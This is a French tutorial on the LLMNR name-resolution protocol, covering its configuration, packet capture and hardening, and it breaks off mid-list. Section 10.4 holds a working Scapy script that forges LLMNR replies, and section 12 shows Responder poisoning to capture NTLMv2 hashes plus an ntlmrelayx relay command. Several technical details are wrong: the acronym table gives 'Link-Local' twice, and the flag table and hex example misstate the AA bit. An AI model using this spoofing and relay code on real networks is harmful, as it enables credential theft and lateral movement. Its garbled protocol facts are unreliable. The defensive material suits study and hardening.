# LLMNR — Link-Local Multicast Name Resolution

> **Auteur / Author :** `HACKERS_TCHAD`  
> **Protocole :** RFC 4795  
> **Niveau :** Débutant → Avancé  
> **Objectif :** Comprendre, configurer, tester, sécuriser et attaquer (en labo) LLMNR en détail.

---

## Table des matières

1. [Acronyme et définition](#1-acronyme-et-définition)
2. [Description générale](#2-description-générale)
3. [Historique et créateurs](#3-historique-et-créateurs)
4. [Pourquoi utiliser LLMNR ?](#4-pourquoi-utiliser-llmnr-)
5. [Architecture et fonctionnement](#5-architecture-et-fonnement)
6. [Format de paquet LLMNR](#6-format-de-paquet-llmnr)
7. [Comparaison DNS / NetBIOS-NS / mDNS / LLMNR](#7-comparaison-dns--netbios-ns--mdns--llmnr)
8. [Configuration](#8-configuration)
9. [Commandes pour vérifier, tester et capturer](#9-commandes-pour-vérifier-tester-et-capturer)
10. [Exemples pratiques](#10-exemples-pratiques)
11. [Applications qui utilisent LLMNR](#11-applications-qui-utilisent-llmnr)
12. [Sécurité et attaques](#12-sécurité-et-attaques)
13. [Mitigations et durcissement](#13-mitigations-et-durcissement)
14. [Dépannage (Troubleshooting)](#14-dépannage-troubleshooting)
15. [Ressources, liens et livres](#15-ressources-liens-et-livres)
16. [Licence et avertissement](#16-licence-et-avertissement)

---

## 1. Acronyme et définition

**LLMNR** signifie :

> **Link-Local Multicast Name Resolution**

### Décomposition

| Acronyme | Signification | Explication |
|----------|---------------|-------------|
| **L** | Link-Local | Le trafic reste limité au segment réseau local (broadcast domain). |
| **L** | Link-Local | Redondant : il s'agit bien de la portée « lien local » (sous-réseau). |
| **M** | Multicast | Les requêtes sont envoyées à une adresse de groupe multicast, pas en broadcast général. |
| **N** | Name | Le protocole sert à résoudre des noms (hostname) en adresses IP. |
| **R** | Resolution | Résolution de noms : nom → IPv4 / IPv6. |

### Déinition technique

LLMNR est un protocole de résolution de noms basé sur le format de paquet DNS, conçu pour fonctionner sur un segment réseau local sans serveur DNS. Il permet à deux hôtes du même sous-réseau de se résoudre mutuellement par leur nom NetBIOS ou leur nom d'hôte DNS, même en l'absence d'infrastructure DNS.

Il a été standardisé dans la RFC **4795** en janvier 2007.

### Résumé en une phrase

> LLMNR est un mécanisme de secours (fallback) à DNS qui envoie des requêtes de résolution de noms en multicast UDP/TCP sur le lien local pour trouver des hôtes voisins.

---

## 2. Description générale

### 2.1 Rôle de LLMNR

Quand un ordinateur Windows (ou un hôte Linux compatible) tente de contacter une ressource par son nom, il suit généralement cet ordre :

```
1. Cache DNS local
2. Fichier hosts (%SystemRoot%\System32\drivers\etc\hosts)
3. Serveur DNS configuré
4. NetBIOS-NS (si activé)
5. LLMNR (multicast local)
6. mDNS (si installé)
```

Si l'étape 3 échoue (par exemple `NXDOMAIN` ou timeout), Windows peut activer LLMNR pour demander à tous les hôtes du réseau local : *« Connaissez-vous ce nom ? »*.

### 2.2 Port et adresses multicast

| Protocole | Adresse / Port | Usage |
|-----------|----------------|-------|
| IPv4 | `224.0.0.252` | Groupe multicast lien-local LLMNR |
| IPv6 | `FF02::1:3` | Groupe multicast lien-local LLMNR |
| Transport | `UDP 5355` | Requêtes/réponses classiques |
| Transport | `TCP 5355` | Réponses longues / zone transfer (rare) |

### 2.3 Scénario typique

1. L'ordinateur `PC-Alice` tape `\\PARTAGE\docs` dans l'explorateur Windows.
2. Windows ne trouve pas `PARTAGE` dans le DNS.
3. Windows envoie une requête LLMNR en multicast : *« Qui est PARTAGE ? »*.
4. L'ordinateur `PC-Bob` (nommé `PARTAGE`) reçoit la requête et répond en unicast : *« Je suis 192.168.1.42 »*.
5. `PC-Alice` établit ensuite une connexion SMB vers `192.168.1.42`.

### 2.4 Avantages

- **Sans configuration** : pas besoin de serveur DNS local.
- **IPv4/IPv6 natif** : fonctionne avec les deux piles.
- **Multicast efficace** : moins intrusif que le broadcast NetBIOS.
- **Compatible DNS** : les paquets ressemblent à des requêtes DNS.

### 2.5 Inconvénients

- **Sécurité faible** : n'importe qui peut répondre à une requête LLMNR.
- **Pas d'authentification** : aucune validation de l'émetteur de la réponse.
- **Limité au sous-réseau** : ne traverse pas les routeurs.
- **Confusion possible** : peut entrer en conflit avec mDNS.

---

## 3. Historique et créateurs

### 3.1 Origine

LLMNR a été développé principalement par **Microsoft** pour pallier les limitations de NetBIOS-NS dans les réseaux modernes IPv6.

### 3.2 Standardisation

- **RFC 4795** : *Link-Local Multicast Name Resolution (LLMNR)*
- Date de publication : **Janvier 2007**
- Statut : **Informational** (pas un Standard plein)
- Auteurs principaux : **Bernard Aboba**, **Dave Thaler**, **Levon Esibov**

### 3.3 Adoption

- **Windows Vista** : première intégration native.
- **Windows 7/8/10/11** : activé par défaut sur la plupart des adaptateurs réseau.
- **Windows Server** : souvent activé, bien que désactivable via GPO.
- **Linux** : support via `systemd-resolved` et certains outils.
- **macOS/iOS** : utilise préférentiellement mDNS (Bonjour) plutôt que LLMNR.

### 3.4 Évolution

Avec la montée en puissance de **mDNS (RFC 6762)** et de **DNS-SD (RFC 6763)**, LLMNR a perdu du terrain, notamment dans les écosystèmes Apple et IoT. Microsoft continue cependant de l'activer par défaut pour la compatibilité des réseaux Windows.

---

## 4. Pourquoi utiliser LLMNR ?

### 4.1 Cas d'usage

| Cas d'usage | Description |
|-------------|-------------|
| Petits réseaux sans DNS | Résolution de noms entre machines d'un bureau ou d'une maison. |
| Réseaux ad-hoc | Réunion, salle de classe, partage de fichiers temporaire. |
| Résolution IPv6 | Remplacement de NetBIOS qui ne supporte pas IPv6. |
| Fallback DNS | Quand le serveur DNS ne connaît pas un hôte local. |
| Partage de fichiers Windows | Découverte de machines par leur nom NetBIOS/DNS. |

### 4.2 Quand LLMNR se déclenche-t-il ?

Sur Windows, LLMNR est utilisé quand :

1. Le nom recherché n'a **pas de suffixe DNS** (single-label name).
2. La requête DNS vers le serveur configuré échoue ou retourne `NXDOMAIN`.
3. Le service **DNS Client** est en cours d'exécution.
4. LLMNR n'a pas été désactivé par GPO ou registre.

Exemple de nom single-label : `SERVEUR` (déclenche LLMNR)  
Exemple de nom FQDN : `serveur.local` (passe par DNS, pas LLMNR)

---

## 5. Architecture et fonctionnement

### 5.1 Vue d'ensemble

```
┌──────────────┐              ┌──────────────┐
│   Client     │              │   Cible      │
│  (émetteur)  │              │  (répondeur) │
│  192.168.1.10│              │  192.168.1.42│
└──────┬───────┘              └──────┬───────┘
       │                             │
       │  UDP 5355 → 224.0.0.252     │
       │  "Qui est PARTAGE ?"        │
       │────────────────────────────>│
       │                             │
       │  UDP 5355 (unicast)         │
       │  "PARTAGE = 192.168.1.42"   │
       │<────────────────────────────│
       │                             │
```

### 5.2 Rôles

| Rôle | Description |
|------|-------------|
| **Sender** | Hôte qui envoie la requête LLMNR. |
| **Responder** | Hôte qui possède le nom demandé et répond. |
| **Querier** | Synonyme de Sender. |

### 5.3 Étapes détaillées

1. **Demande de résolution** : l'application appelle `getaddrinfo("PARTAGE", ...)`.
2. **Échec DNS** : le résolveur local tente le DNS, obtient `NXDOMAIN`.
3. **Multicast LLMNR** : le client envoie une requête DNS-like vers `224.0.0.252:5355` (IPv4) ou `FF02::1:3:5355` (IPv6).
4. **Écoute des réponses** : tous les hôtes du lien local écoutent le port 5355.
5. **Réponse unicast** : seul l'hôte possédant le nom répond directement au demandeur.
6. **Mise en cache locale** : le client stocke temporairement la correspondance nom/IP.
7. **Connexion** : l'application utilise l'IP obtenue.

### 5.4 Gestion des conflits

Si plusieurs hôtes répondent avec le même nom, Windows déclenche un **conflit de noms** (name conflict). Le premier arrivé conserve son nom, les autres peuvent être signalés comme doublons.

### 5.5 Timer et retransmissions

| Paramètre | Valeur typique |
|-----------|----------------|
| Délai avant première requête LLMNR | ~80 ms après échec DNS |
| Nombre de retransmissions | 2-3 |
| Intervalle entre retransmissions | exponentiel (backoff) |
| Timeout total | environ 1 seconde |

---

## 6. Format de paquet LLMNR

### 6.1 Similitude avec DNS

LLMNR reprend la structure des messages DNS définie dans la RFC 1035 :

```
+---------------------+
|        Header       |  12 octets
+---------------------+
|       Question      |  la section question
+---------------------+
|        Answer       |  section réponse (optionnelle)
+---------------------+
|      Authority      |  section autorité (optionnelle)
+---------------------+
|      Additional     |  section additionnelle (optionnelle)
+---------------------+
```

### 6.2 Drapeaux (Flags) spécifiques

Dans le champ `Flags` de 16 bits, quelques bits ont une signification particulière pour LLMNR :

| Bit | Nom | Signification |
|-----|-----|---------------|
| 15 | QR | 0 = Query, 1 = Response |
| 5 | AA (Authoritative Answer) | Toujours 1 dans une réponse LLMNR |
| 9 | TC (Truncated) | Indique que la réponse est tronquée (passage en TCP) |
| 10 | T (Tentative) | Indique une réponse provisoire (rare) |

Les champs `OPCODE`, `RCODE`, `QDCOUNT`, `ANCOUNT`, etc. suivent la sémantique DNS.

### 6.3 Types de requêtes courants

| Type DNS | Valeur | Usage dans LLMNR |
|----------|--------|------------------|
| A | 1 | Demande d'adresse IPv4 |
| AAAA | 28 | Demande d'adresse IPv6 |
| PTR | 12 | Résolution inverse |
| SRV | 33 | Service record (rare) |

### 6.4 Exemple de requête LLMNR (hexadécimal)

```
00 00 00 00 00 01 00 00 00 00 00 00   ; Header
07 50 41 52 54 41 47 45 00            ; "PARTAGE"
00 01 00 01                           ; Type A, Class IN
```

Explication :
- `00 00` : ID de transaction = 0
- `00 00` : Flags = requête standard
- `00 01` : 1 question
- `00 00 00 00 00 00` : pas de réponse/autorité/additionnel
- `07 50 41 52 54 41 47 45 00` : label `PARTAGE` (7 octets)
- `00 01` : Type A
- `00 01` : Class IN (Internet)

### 6.5 Exemple de réponse LLMNR

```
00 00 80 00 00 01 00 01 00 00 00 00   ; Header (QR=1, AA=1)
07 50 41 52 54 41 47 45 00            ; "PARTAGE"
00 01 00 01                           ; Question A/IN
07 50 41 52 54 41 47 45 00            ; Répétition du nom
00 01 00 01                           ; Type A, Class IN
00 00 00 3C                           ; TTL = 60 secondes
00 04                                 ; Longueur des données = 4
C0 A8 01 2A                           ; Adresse IPv4 = 192.168.1.42
```

---

## 7. Comparaison DNS / NetBIOS-NS / mDNS / LLMNR

| Caractéristique | DNS | NetBIOS-NS | mDNS | LLMNR |
|-----------------|-----|------------|------|-------|
| **Standard** | RFC 1035 | RFC 1001/1002 | RFC 6762 | RFC 4795 |
| **Port** | 53 | 137 | 5353 | 5355 |
| **Multicast** | Non | Oui (broadcast) | Oui | Oui |
| **IPv6** | Oui | Non | Oui | Oui |
| **Authentification** | DNSSEC (optionnel) | Non | Non | Non |
| **Scope** | Global | Local | Lien-local | Lien-local |
| **Usage principal** | Internet | Anciens réseaux Windows | Apple/IoT | Windows modernes |
| **Suffixe requis** | FQDN | Non | Non | Non (single-label) |
| **Conflit de noms** | Géré par DNS | Oui | Oui | Oui |

### 7.1 LLMNR vs mDNS

- **mDNS** est utilisé par Apple Bonjour, imprimantes réseau, IoT.
- **LLMNR** est utilisé par Windows.
- Les deux utilisent des adresses multicast différentes et ne sont pas compatibles.

### 7.2 LLMNR vs NetBIOS-NS

- NetBIOS-NS utilise le **broadcast** (255.255.255.255) sur le port 137.
- LLMNR utilise le **multicast** (224.0.0.252) sur le port 5355.
- NetBIOS est limité à IPv4 ; LLMNR supporte IPv6.

---

## 8. Configuration

### 8.1 Windows — Vue d'ensemble

LLMNR est géré par le service **DNS Client** (`dnscache`). Il peut être désactivé de plusieurs façons :

- Stratégie de groupe (GPO)
- Registre Windows
- PowerShell (indirectement via GPO / registre)
- `netsh` (limité)

### 8.2 Désactiver LLMNR via le Registre

#### Méthode rapide (machine entière)

```powershell
# Vérifier la valeur actuelle
Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name "EnableMulticast"

# Désactiver LLMNR
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT" -Name "DNSClient" -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" `
    -Name "EnableMulticast" -Value 0 -PropertyType DWORD -Force

# Activer LLMNR
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" `
    -Name "EnableMulticast" -Value 1
```

#### Explication de la clé

| Valeur | Signification |
|--------|---------------|
| `0` | LLMNR désactivé |
| `1` | LLMNR activé |
| Non définie | Comportement par défaut (généralement activé) |

Chemin complet :

```
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient
```

### 8.3 Désactiver LLMNR via une GPO

1. Ouvrir `gpmc.msc` (Group Policy Management).
2. Créer ou modifier une GPO liée à l'OU cible.
3. Naviguer vers :
   ```
   Computer Configuration → Administrative Templates → Network → DNS Client
   ```
4. Activer la stratégie :
   ```
   Turn off multicast name resolution
   ```
5. Redémarrer le client ou exécuter `gpupdate /force`.

### 8.4 Désactiver LLMNR par adaptateur (NetBIOS / WINS)

Pour un adaptateur spécifique, on peut aussi jouer sur l'ordre de résolution via les propriétés IPv4/IPv6. Cependant, la méthode la plus fiable reste la GPO ou le registre.

### 8.5 Vérifier l'état LLMNR avec PowerShell

```powershell
# Lire la configuration actuelle
$path = "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient"
if (Test-Path $path) {
    Get-ItemProperty -Path $path -Name "EnableMulticast"
} else {
    Write-Host "Clé absente : LLMNR utilise la valeur par défaut (activé)."
}

# Vérifier que le service DNS Client est actif
Get-Service dnscache

# Lister les adaptateurs et leur suffixe DNS
Get-NetAdapter | Select-Object Name, InterfaceIndex, Status
Get-DnsClient | Select-Object InterfaceIndex, ConnectionSpecificSuffix, RegisterThisConnectionsAddress
```

### 8.6 Configuration Linux

#### systemd-resolved

La plupart des distributions modernes (Ubuntu 18.04+, Debian 10+, Fedora) utilisent `systemd-resolved`. LLMNR y est souvent activé par défaut.

##### Vérifier l'état

```bash
resolvectl status
```

Sortie typique :

```
Global
       LLMNR setting: yes
MulticastDNS setting: yes
  DNSOverTLS setting: no
      DNSSEC setting: no
```

##### Désactiver LLMNR

```bash
# Éditer le fichier de configuration
sudo nano /etc/systemd/resolved.conf
```

Modifier ou ajouter :

```ini
[Resolve]
LLMNR=no
MulticastDNS=no
```

Puis recharger :

```bash
sudo systemctl restart systemd-resolved
resolvectl status
```

Valeurs possibles pour `LLMNR` :

| Valeur | Signification |
|--------|---------------|
| `yes` | Activé |
| `no` | Désactivé |
| `resolve` | Uniquement pour résoudre, pas pour annoncer |

#### Interface spécifique

```bash
# Désactiver LLMNR sur une interface
sudo resolvectl llmnr eth0 no

# Activer
sudo resolvectl llmnr eth0 yes
```

#### Réseau NetworkManager

Dans `/etc/NetworkManager/NetworkManager.conf` :

```ini
[connection]
connection.mdns=no
connection.llmnr=no
```

Puis recharger NetworkManager :

```bash
sudo systemctl restart NetworkManager
```

### 8.7 Configuration macOS

macOS utilise mDNS/Bonjour par défaut. LLMNR n'est généralement pas activé nativement. Il est possible de le désactiver via la ligne de commande si un logiciel tiers l'a activé :

```bash
# macOS n'active pas LLMNR par défaut.
# Pour vérifier les services de découverte :
sudo lsof -i UDP:5355
```

### 8.8 Pare-feu et routeurs

Pour bloquer LLMNR au niveau réseau :

| Plateforme | Règle |
|------------|-------|
| iptables | `iptables -A INPUT -p udp --dport 5355 -j DROP` |
| nftables | `nft add rule inet filter input udp dport 5355 drop` |
| pf (FreeBSD/macOS) | `block in quick proto udp to any port 5355` |
| Cisco ACL | `deny udp any any eq 5355` |
| Windows Firewall | Bloquer le port 5355 UDP entrant/sortant |

> **Attention :** bloquer LLMNR peut empêcher la résolution de noms dans les petits réseaux sans DNS.

---

## 9. Commandes pour vérifier, tester et capturer

### 9.1 Windows

#### Vérifier l'état LLMNR

```powershell
# Clé de registre
Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient -Name EnableMulticast -ErrorAction SilentlyContinue

# Netsh (informations limitées)
netsh interface ipv4 show interface
netsh interface ipv4 show dnsservers
```

#### Forcer une requête LLMNR

```powershell
# Ping un nom single-label inexistant dans le DNS
ping PARTAGE_INEXISTANT -4
```

Si le nom n'est pas dans le DNS mais qu'un hôte local répond, LLMNR a fonctionné.

#### Nettoyer le cache DNS

```powershell
ipconfig /flushdns
```

#### Voir le cache LLMNR/DNS

```powershell
Get-DnsClientCache | Where-Object { $_.Entry -like "*PARTAGE*" }
```

### 9.2 Linux

#### Vérifier l'écoute du port 5355

```bash
sudo ss -lunp | grep 5355
sudo netstat -lunp | grep 5355
```

#### Envoyer une requête LLMNR manuellement avec dig

```bash
# dig ne supporte pas directement le multicast LLMNR, mais on peut tester la résolution
resolvectl query PARTAGE
```

#### Capturer avec tcpdump

```bash
# Sur une interface spécifique
sudo tcpdump -i eth0 -nn -s0 -v udp port 5355

# Sauvegarder dans un fichier pcap
sudo tcpdump -i eth0 -nn -s0 -w llmnr_traffic.pcap udp port 5355

# Filtrer les adresses multicast LLMNR
sudo tcpdump -i eth0 -nn 'host 224.0.0.252 or host ff02::1:3'
```

#### Envoyer une requête LLMNR avec Scapy

```python
#!/usr/bin/env python3
from scapy.all import *

# Construire une requête LLMNR
llmnr_ip = "224.0.0.252"
llmnr_port = 5355
hostname = "PARTAGE"

# Requête DNS-like
query = IP(dst=llmnr_ip)/UDP(dport=llmnr_port, sport=RandShort())/\
        DNS(qd=DNSQR(qname=hostname, qtype="A"))

# Envoyer et écouter les réponses
ans = sr1(query, timeout=2, iface="eth0")
if ans:
    ans.show()
else:
    print("Aucune réponse LLMNR reçue.")
```

### 9.3 Wireshark

#### Filtres de capture

```
udp.port == 5355
llmnr
ipv6.dst == ff02::1:3
ip.dst == 224.0.0.252
```

#### Filtres d'affichage

```
llmnr.flags.response == 0   # requêtes
llmnr.flags.response == 1   # réponses
llmnr.queries.name contains "PARTAGE"
llmnr.resp.name contains "PARTAGE"
```

### 9.4 PowerShell avancé — Sniffer maison

```powershell
# Nécessite des droits élevés
$port = 5355
$endpoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Any, $port)
$udp = New-Object System.Net.Sockets.UdpClient $port

Write-Host "Écoute LLMNR sur le port $port..."
while ($true) {
    $content = $udp.Receive([ref]$endpoint)
    $data = [BitConverter]::ToString($content)
    Write-Host "Reçu de $($endpoint.Address):$($endpoint.Port) -> $data"
}
```

---

## 10. Exemples pratiques

### 10.1 Exemple 1 — Résolution simple dans un réseau domestique

**Topologie :**

```
[PC-Alice 192.168.1.10] ──── [Switch] ──── [PC-Bob 192.168.1.20]
```

**Objectif :** Alice veut pinger Bob par son nom `BOB-PC`.

**Étapes :**

1. Alice ouvre un terminal et tape :
   ```cmd
   ping BOB-PC
   ```
2. Windows consulte le DNS : pas de réponse.
3. Windows envoie une requête LLMNR en multicast.
4. Bob reçoit la requête, reconnaît son nom et répond :
   ```
   BOB-PC = 192.168.1.20
   ```
5. Alice reçoit la réponse et le ping commence.

**Résultat :**

```
Réponse de 192.168.1.20 : octets=32 temps<1ms TTL=128
```

### 10.2 Exemple 2 — Capture Wireshark complète

**Filtre :** `llmnr`

**Paquet 1 — Requête :**

```
Source: 192.168.1.10
Destination: 224.0.0.252
Protocol: LLMNR
Info: Standard query 0x0000 A BOB-PC
```

**Paquet 2 — Réponse :**

```
Source: 192.168.1.20
Destination: 192.168.1.10
Protocol: LLMNR
Info: Standard query response 0x0000 A BOB-PC A 192.168.1.20
```

### 10.3 Exemple 3 — Script Python pour envoyer et parser LLMNR

```python
#!/usr/bin/env python3
"""
LLMNR Query Tool — HACKERS_TCHAD
Usage: python3 llmnr_query.py <hostname>
"""
import sys
import socket
import struct

LLMNR_MCAST = "224.0.0.252"
LLMNR_PORT = 5355


def build_llmnr_query(hostname: str) -> bytes:
    """Construit une requête LLMNR (format DNS) pour un nom A/IN."""
    transaction_id = 0x0000
    flags = 0x0000
    questions = 1
    answer_rrs = 0
    authority_rrs = 0
    additional_rrs = 0

    header = struct.pack(
        "!HHHHHH",
        transaction_id,
        flags,
        questions,
        answer_rrs,
        authority_rrs,
        additional_rrs,
    )

    question = b""
    for label in hostname.split("."):
        question += bytes([len(label)]) + label.encode("ascii")
    question += b"\x00"  # fin du nom
    question += struct.pack("!HH", 1, 1)  # Type A, Class IN

    return header + question


def parse_response(data: bytes) -> str:
    """Extrait l'adresse IPv4 d'une réponse LLMNR A."""
    if len(data) < 12:
        return "Réponse trop courte"

    # Ignorer l'en-tête et la question pour atteindre la section réponse
    # Cette implémentation est simplifiée ; un vrai parseur gère la compression DNS.
    idx = 12
    # Sauter le nom de la question (terminé par 0x00)
    while data[idx] != 0:
        idx += 1 + data[idx]
    idx += 1 + 4  # fin de nom + QTYPE/QCLASS

    # Section réponse
    # Sauter le nom de la réponse (compression : pointeur 2 octets si >= 0xC0)
    if data[idx] & 0xC0 == 0xC0:
        idx += 2
    else:
        while data[idx] != 0:
            idx += 1 + data[idx]
        idx += 1

    idx += 8  # TYPE (2), CLASS (2), TTL (4)
    rdlength = struct.unpack("!H", data[idx : idx + 2])[0]
    idx += 2
    rdata = data[idx : idx + rdlength]

    if rdlength == 4:
        return ".".join(str(b) for b in rdata)
    return f"RDATA non IPv4: {rdata.hex()}"


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <hostname>")
        sys.exit(1)

    hostname = sys.argv[1]
    query = build_llmnr_query(hostname)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.settimeout(2)

    # Rejoindre le groupe multicast
    mreq = struct.pack("=4sl", socket.inet_aton(LLMNR_MCAST), socket.INADDR_ANY)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)

    sock.sendto(query, (LLMNR_MCAST, LLMNR_PORT))
    print(f"Requête LLMNR envoyée pour '{hostname}' ...")

    try:
        data, addr = sock.recvfrom(1024)
        print(f"Réponse reçue de {addr[0]}:{addr[1]}")
        print(f"Adresse résolue : {parse_response(data)}")
    except socket.timeout:
        print("Aucune réponse reçue.")
    finally:
        sock.close()


if __name__ == "__main__":
    main()
```

**Exécution :**

```bash
python3 llmnr_query.py BOB-PC
```

**Sortie attendue :**

```
Requête LLMNR envoyée pour 'BOB-PC' ...
Réponse reçue de 192.168.1.20:5355
Adresse résolue : 192.168.1.20
```

### 10.4 Exemple 4 — Forger une réponse LLMNR (preuve de concept)

> **Usage uniquement en laboratoire contrôlé.**

```python
#!/usr/bin/env python3
from scapy.all import *

iface = "eth0"
victim_ip = "192.168.1.10"
spoofed_name = "PARTAGE"
spoofed_ip = "192.168.1.99"

# Écouter les requêtes LLMNR
sniff_filter = "udp port 5355"


def handle_llmnr(pkt):
    if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
        qname = pkt[DNS].qd.qname.decode()
        if spoofed_name.lower() in qname.lower():
            print(f"[+] Requête LLMNR pour {qname} détectée de {pkt[IP].src}")
            response = (
                IP(dst=pkt[IP].src, src=pkt[IP].dst)
                / UDP(dport=pkt[UDP].sport, sport=5355)
                / DNS(
                    id=pkt[DNS].id,
                    qr=1,
                    aa=1,
                    qd=pkt[DNS].qd,
                    an=DNSRR(rrname=qname, type="A", ttl=60, rdata=spoofed_ip),
                )
            )
            send(response, iface=iface, verbose=False)
            print(f"[+] Réponse forgée envoyée : {spoofed_name} = {spoofed_ip}")


print("[*] Écoute LLMNR en cours...")
sniff(iface=iface, filter=sniff_filter, prn=handle_llmnr)
```

---

## 11. Applications qui utilisent LLMNR

### 11.1 Systèmes d'exploitation

| OS | Support | Défaut |
|----|---------|--------|
| Windows Vista/7/8/10/11 | Natif | Activé |
| Windows Server 2008+ | Natif | Activé |
| Linux + systemd-resolved | Oui | Activé sur certaines distros |
| Android | Non | - |
| macOS/iOS | Non (mDNS) | - |

### 11.2 Services et protocoles

| Service | Utilisation de LLMNR |
|---------|------------------------|
| **SMB / CIFS** | Résolution de noms de partages Windows. |
| **RDP** | Connexion à `nom_hôte` sans DNS. |
| **RPC/DCOM** | Résolution d'hôtes pour les appels distants. |
| **Ping / Tracert** | Résolution fallback des noms simples. |
| **PowerShell Remoting** | `Enter-PSSession -ComputerName NOM`. |
| **WMI** | Connexions WMI par nom d'hôte. |

### 11.3 Scénarios d'entreprise

- **Petits bureaux** sans contrôleur de domaine DNS.
- **Réseaux invités** où les postes Windows se découvrent.
- **Réunions et salons** avec partage de fichiers ad-hoc.
- **Serveurs Windows Workgroup** (groupe de travail, pas de domaine AD).

---

## 12. Sécurité et attaques

### 12.1 Pourquoi LLMNR est dangereux

LLMNR ne fournit **aucune authentification** des réponses. N'importe quel attaquant du même sous-réseau peut répondre à une requête LLMNR et rediriger la victime vers une machine contrôlée.

### 12.2 LLMNR Poisoning

L'attaque classique :

1. La victime tente d'accéder à `\\PARTAGE\fichier`.
2. Le vrai `PARTAGE` est injoignable ou le DNS retourne `NXDOMAIN`.
3. La victime envoie une requête LLMNR multicast.
4. L'attaquant répond plus vite que tout le monde : *« PARTAGE = IP_de_l_attaquant »*.
5. La victime se connecte à l'attaquant.
6. L'attaquant demande une authentification SMB et capture le **hash NTLM** de la victime.

### 12.3 Outils d'attaque

| Outil | Description |
|-------|-------------|
| **Responder** | Outil de Laurent Gaffie pour empoisonner LLMNR, NBT-NS et mDNS. |
| **Inveigh** | Implémentation PowerShell de Responder. |
| **mitm6** | Empoisonnement IPv6 + LLMNR/DHCPv6 par Fox-IT. |
| **Impacket** | Suite Python pour relayer et cracker les hashes NTLM. |

### 12.4 Exemple d'attaque avec Responder

**Sur Kali Linux :**

```bash
# Lancer Responder sur l'interface eth0
sudo responder -I eth0 -wrfv

# Options courantes :
# -I : interface
# -w : démarrer le serveur WPAD
# -r : activer les réponses aux requêtes
# -f : fingerprinting
# -v : verbeux
```

**Déroulement :**

1. Sur une machine Windows du même réseau, taper :
   ```cmd
   net use \\PARTAGE_FAUX\partage
   ```
2. Windows envoie une requête LLMNR.
3. Responder répond avec l'IP de Kali.
4. Windows envoie une requête SMB avec authentification NTLM.
5. Responder capture le hash :
   ```
   [SMB] NTLMv2-SSP Client   : 192.168.1.10
   [SMB] NTLMv2-SSP Username : DOMAINE\alice
   [SMB] NTLMv2-SSP Hash     : alice::DOMAINE:...CHALLENGE...RESPONSE...
   ```

### 12.5 Relais NTLM (NTLM Relay)

Après capture, l'attaquant peut relayer le hash vers un autre serveur SMB vulnérable :

```bash
# Avec impacket-ntlmrelayx
impacket-ntlmrelayx -tf targets.txt -smb2support
```

### 12.6 Impact d'une attaque LLMNR

| Impact | Description |
|--------|-------------|
| Vol de credentials | Capture de hashes NTLM/v2. |
| Man-in-the-Middle | Redirection du trafic SMB/HTTP. |
| Élévation de privilèges | Relay vers des services sensibles. |
| Propagation latérale | Rejeu de credentials pour se déplacer dans le réseau. |

---

## 13. Mitigations et durcissement

### 13.1 Désactiver LLMNR

La meilleure mitigation : **désactiver LLMNR** si un DNS local fiable est disponible.

#### Via GPO (recommandé en entreprise)

```
Turn off multicast name resolution = Enabled
```

#### Via Registre (scriptable)

```powershell
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT" -Name "DNSClient" -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" `
    -Name "EnableMulticast" -Value 0 -PropertyType DWORD -Force
```

### 13.2 Désactiver NetBIOS-NS

NetBIOS-NS est un protocole similaire et tout aussi vulnérable.

#### Par GPO / registre

```powershell
# Désactiver NetBIOS via la configuration TCP/IP des adaptateurs
$adapters = Get-WmiObject Win32_NetworkAdapterConfiguration -Filter "IPEnabled='True'"
foreach ($adapter in $adapters) {
    $adapter.SetTcpipNetbios(2)  # 2 = Disabled
}
```

### 13.3 Activer SMB Signing

Empêche certains relais NTLM SMB :

```powershell
# Requiert la signature SMB
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" `
    -Name "RequireSecuritySignature" -Value 1
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" `
    -Name "RequireSecuritySignature" -Value 1
```

### 13.4 Segmenter le réseau

- Isoler les postes invités.
- Utiliser des VLANs pour limiter la portée du multicast LLMNR.
- Activer le **Private VLAN** (PVLAN) sur les switches.

### 13.5 Utiliser un DNS local

Déployer un serveur DNS interne (Windows Server DNS, BIND, dnsmasq, pi-hole) pour résoudre tous les noms locaux. Cela réduit le recours à LLMNR.

### 13.6 Autres bonnes pratiques

- **Désactiver LLMNR et mDNS** sur les serveurs sensibles.
- **Activer l'authentification réseau avancée** (Kerberos, LDAPS).
- **Surveiller le trafic** sur le port 5355.
- **Sensibiliser les utilisateurs** à ne pas accéder à des partages inconnus.

### 13.7 Tableau récapitulatif des mitigations

| Mitigation | Effort | Efficacité |
|------------|--------|------------|
| Désactiver LLMNR | Faible | Très élevée |
| Désactiver NetBIOS-NS | Faible | Très élevée |
| SMB Signing | Faible | Élevée |
| DNS local | Moyen | Élevée |
| Segmentation VLAN | Moyen | Élevée |
| Surveillance port 5355 | Moyen | Moyenne |

---

## 14. Dépannage (Troubleshooting)

### 14.1 LLMNR ne fonctionne pas

#### Vérifier que le service DNS Client est actif

```powershell
Get-Service dnscache | Select-Object Name, Status, StartType
```

#### Vérifier la clé de registre

```powershell
Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient -Name EnableMulticast
```

Si la valeur est `0`, LLMNR est désactivé.

#### Vérifier le pare-feu

```powershell
Get-NetFirewallRule -DisplayName "*LLMNR*" | Select-Object DisplayName, Enabled, Action
```

### 14.2 Conflit de noms LLMNR

Si deux machines portent le même nom :

1. Renommer l'une des deux machines.
2. Vider le cache DNS :
